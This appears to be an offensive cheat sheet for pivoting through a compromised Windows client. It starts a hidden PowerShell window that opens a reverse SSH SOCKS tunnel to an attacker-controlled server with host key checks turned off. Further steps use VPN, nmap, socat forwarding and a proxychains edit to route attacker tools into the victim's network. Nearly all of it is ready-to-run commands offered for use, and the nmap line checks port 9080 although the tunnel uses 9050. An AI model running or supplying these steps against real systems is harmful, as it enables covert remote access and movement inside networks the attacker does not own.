# start ssh connection from compromised client to ssh server
```
Start-Process -FilePath "powershell" -ArgumentList " -w hidden -c ssh -p 22 -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<sshRhost>"
```

# start vpn from local attacker machine to ssh server
```
openvpn --config <file>.ovpn
```

# check if port 9050 on ssh server is reachable from attacker machine
```
nmap -p 9080 -Pn -n <sshRhost>
```

# if not redirect traffic on rootserver
```
socat TCP-LISTEN:9051,fork TCP:localhost:9050
```

# reconfigure listener port on attacker machine
```
sed -i 's/ 9050/ 9051/g' /etc/proxychains4.conf
```

# execute tools on attacker machine
```
proxychains firefox
```

